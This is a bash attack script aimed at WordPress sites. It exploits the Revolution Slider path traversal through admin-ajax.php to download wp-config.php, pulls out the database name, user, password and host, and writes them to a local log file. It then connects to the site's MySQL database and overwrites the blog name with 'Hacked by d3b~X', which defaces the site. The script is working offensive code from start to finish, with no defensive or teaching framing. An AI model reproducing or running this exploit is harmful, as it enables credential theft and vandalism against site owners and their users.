#!/bin/bash
echo $1 | grep "http" >/dev/null;chx=$?
 if [ $chx -eq 0 ];then
   hostx=$1
   else
   hostx="http://$1"
 fi
echo "Scan $hostx"
 
FCK="rev"
CekDFC(){
 curl --silent --max-time 10 --connect-timeout 10 "${1}" -o tmp/${FCK}gck.txt
  if [ -f tmp/${FCK}gck.txt ];then
    cat tmp/${FCK}gck.txt | grep -i "Hacked by d3b" >/dev/null;gck=$?
    if [ $gck -eq 0 ];then
     echo " + Exploit success"
    fi
  fi
}
 
rm -f xx.txt
curl --silent --max-time 10 --connect-timeout 10 "${hostx}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php" -o xx.txt
filex="xx.txt"
if [ ! -f $filex ];then
 exit
fi
DN=$(cat $filex | grep "DB_NAME" | cut -d "'" -f 4)
DU=$(cat $filex | grep "DB_USER" | cut -d "'" -f 4)
DP=$(cat $filex | grep "DB_PASSWORD" | cut -d  "'" -f 4)
DH=$(cat $filex | grep "DB_HOST" | cut -d "'" -f 4)
PRF=$(cat $filex | grep "table_prefix" | cut -d "'" -f 2)
 
fip=$(echo $hostx | cut -d '/' -f 3)
ipx=$(host $fip | awk '/has address/ { print $4 }')
 
echo "$DH" | grep "localhost\|127.0.0.1" >/dev/null;ch=$?
 if [ $ch -eq 1 ];then
  hostz=$DH
   else
  hostz=$ipx
 fi
#echo $hostx
CMN="UPDATE \`${PRF}options\` SET \`option_value\`=\"Hacked by d3b~X\" WHERE \`option_name\`=\"blogname\""
#echo $CMN
 
if [ ! -z $DN ];then
echo "Db        = $DN"
echo "Host      = $hostz"
echo "User      = $DU"
echo "Pass      = $DP"
echo $hostx >> log.txt
echo "Db        = $DN" >> log.txt
echo "Host      = $hostz" >> log.txt
echo "User      = $DU" >> log.txt
echo "Pass      = $DP" >> log.txt
echo "Pref      = $PRF" >> log.txt
echo "====================================" >> log.txt
echo "................ Deface"
mysql -h $DH -D $DN -u $DU -p${DP} -e "$CMN" >/dev/null 2>error.txt
 CekDFC $hostx 1
fi
